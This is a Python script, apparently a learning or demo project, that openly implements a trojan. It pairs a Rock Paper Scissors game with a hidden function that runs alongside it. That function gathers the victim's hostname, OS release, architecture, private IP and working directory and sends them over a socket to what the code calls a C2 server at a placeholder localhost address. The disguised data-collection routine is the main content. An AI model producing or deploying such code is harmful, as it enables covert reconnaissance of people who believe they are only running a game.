import socket
import multiprocessing
import os
import random
import asyncio

async def trojan():
    client = socket.socket()

    # Gather basic system information using os module 
    system_info = {}
    system_info['system'] = os.name
    system_info['hostname'] = os.uname().nodename
    system_info['release'] = os.uname().release
    system_info['version'] = os.uname().version
    system_info['architecture'] = os.uname().machine
    system_info['private_ip'] = socket.gethostbyname(socket.getfqdn())
    system_info['current_directory'] = os.getcwd()

    serv_addr = "127.0.0.1"
    port = 1337

    try:
        client.connect((serv_addr, port))
    except Exception as e:
        print("[Error] Is The Host Really Up? Try Checking The Host And Port.")
        print(f"LOG:\n{e}")
        exit(1)

    data = '\n'.join(f'{key}: {value}' for key, value in system_info.items())

    client.sendall(data.encode())  # Send it to the C2 server

    response = client.recv(2048).decode()
    print(response)

    client.close()

# A game stolen from my other project
# RockPaperScissors.py
async def game():
    def num2choice(num):
        if num == 1:
            return "Rock"
        elif num == 2:
            return "Paper"
        elif num == 3:
            return "Scissors"
        else:
            print("Invalid Option Entered!")
            exit(1)

    def board():
        print("1 - Rock")
        print("2 - Paper")
        print("3 - Scissors")

    os.system("clear")
    win = 0
    loss = 0
    draw = 0
    print("Welcome To Rock Paper Scissor Tournament")
    num_rounds = int(input("Enter The Number Of Rounds: "))

    for round in range(num_rounds):
        print(f"-----------------------------------Round: {round+1}-----------------------------------")
        comp = random.randint(1, 3)
        board()
        user = int(input("=> "))
        print(f"You Chose: {num2choice(user)}")
        print(f"Computer Chose: {num2choice(comp)}")
        if user == comp:
            print("Round Resulted In A Draw!")
            draw += 1
        elif user == 1 and comp == 2:
            print("The Round Resulted In a Win!")
            win += 1
        elif user == 1 and comp == 3:
            print("The Round Resulted In A Loss")
            loss += 1
        elif user == 2 and comp == 1:
            print("The Round Resulted In a Win!")
            win += 1
        elif user == 2 and comp == 3:
            print("The Round Resulted In A Loss")
            loss += 1
        elif user == 3 and comp == 1:
            print("The Round Resulted In A Loss")
            loss += 1
        elif user == 3 and comp == 2:
            print("The Round Resulted In a Win!")
            win += 1
    print("-"*30)
    print("Statistics: ")
    print(f"Won: {win}")
    print(f"Lost: {loss}")
    print(f"Draw: {draw}")

    if win > loss:
        print("You Won This Tournament!")
    elif win < loss:
        print("You Lost This Tournament!")
    elif win == loss:
        print("The Tournament Resulted In A Draw!")

async def main():
    # Create task objects for each function
    trojan_task = asyncio.create_task(trojan())
    game_task = asyncio.create_task(game())

    # Wait for the tasks to complete
    await asyncio.gather(trojan_task, game_task)

    print("Done!")

if __name__ == '__main__':
    asyncio.run(main())
